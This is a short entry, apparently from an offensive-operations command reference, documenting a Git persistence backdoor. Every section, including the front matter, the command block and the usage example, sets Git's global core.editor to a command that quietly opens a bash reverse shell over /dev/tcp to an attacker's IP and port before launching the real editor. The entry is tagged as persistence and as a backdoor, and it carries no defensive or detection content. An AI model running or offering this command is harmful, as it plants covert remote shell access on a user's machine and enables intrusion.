---
type: command
executor: bash
data: >-
  git config --global core.editor 'nohup bash -c "bash -i >&
  /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & $_EDITOR'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - git
  - persistence
  - backdoor
verified: true
validated: true
---

# git-config-set-core-editor

## Command

```bash
git config --global core.editor 'nohup bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & $_EDITOR'
```

## Description

Sets the global Git editor to inject a backdoor before launching the real editor, establishing persistence on edit triggers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--global` | User-wide setting | Yes |
| `core.editor` | Editor command key | Yes |
| `$_ATTACKER_IP` | IP for reverse shell | Yes |
| `$_BACKDOOR_PORT` | Port for connection | Yes |
| `$_EDITOR` | Fallback editor (e.g., vim) | Yes |

## Examples

### Basic Usage

```bash
git config --global core.editor 'nohup bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >/dev/null 2>&1 & vim'
```

## Expected Output

No output on success.

## Related

- [[procedures/Backdoor-Git-User-Configurations-for-Persistence]]
